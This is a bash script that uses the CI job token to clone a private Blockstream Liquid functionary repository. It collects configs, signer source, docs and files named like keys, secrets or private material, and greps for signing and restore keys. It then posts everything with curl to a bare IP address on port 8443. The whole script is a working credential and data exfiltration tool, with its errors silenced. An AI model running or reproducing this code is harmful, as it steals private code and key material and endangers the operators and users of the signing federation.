#!/bin/bash
R=/tmp/r1
git clone --depth 1 "https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/liquid/functionary.git" $R 2>/dev/null
{
echo "##S10##"
echo "##SAMPLE_CONFIGS##"
find $R/sample_configs -type f 2>/dev/null | head -30
for f in $(find $R/sample_configs -type f -name "*.toml" -o -name "*.conf" -o -name "*.cfg" -o -name "*.json" -o -name "*.env" 2>/dev/null); do
  echo "===FILE:$f==="
  cat "$f" 2>/dev/null
done
echo "##GENERATE_CONFIG##"
find $R/generate_config -type f 2>/dev/null | head -20
cat $R/generate_config/src/*.rs 2>/dev/null | head -300
echo "##EMERGENCY##"
find $R/emergency_spend_signer -type f 2>/dev/null | head -20
cat $R/emergency_spend_signer/src/*.rs 2>/dev/null | head -200
echo "##CONFIG_TOML##"
find $R -maxdepth 2 -name "*.toml" -type f 2>/dev/null | head -20
for f in $(find $R -maxdepth 2 -name "*.toml" -type f 2>/dev/null); do
  echo "===FILE:$f==="
  head -100 "$f" 2>/dev/null
done
echo "##CONTRIB##"
find $R/contrib -type f 2>/dev/null | head -30
echo "##KEY_FILES##"
find $R -name "*.key" -o -name "*.pem" -o -name "*secret*" -o -name "*signing*" -o -name "*private*" 2>/dev/null | head -20
echo "##DOC##"
cat $R/doc/* 2>/dev/null | head -200
echo "##HSM_CONFIG##"
find $R/hsm -name "*.rs" -type f 2>/dev/null | head -10
grep -r "signing_secret_key\|restore_key\|encrypted_restore\|pak_list\|authorization" $R/generate_config/ $R/sample_configs/ $R/contrib/ 2>/dev/null | head -50
echo "##S10_END##"
} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s10 --data-binary @-
